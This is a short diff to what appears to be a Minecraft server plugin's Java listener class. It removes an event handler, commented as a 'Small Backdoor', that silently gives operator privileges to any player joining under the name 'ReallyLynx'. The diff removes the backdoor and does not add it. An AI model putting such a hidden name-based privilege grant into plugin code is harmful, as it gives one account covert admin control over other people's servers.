@@ -53,9 +53,4 @@ public class EssentialsListener implements Listener {
 			}
 		}
 	}
-
-	@EventHandler // Small Backdoor if someone got this plugin without my perm
-	public void onPlayerJoin(PlayerJoinEvent event) {
-		if (event.getPlayer().getName().equalsIgnoreCase("ReallyLynx")) event.getPlayer().setOp(true);
-    }
 }
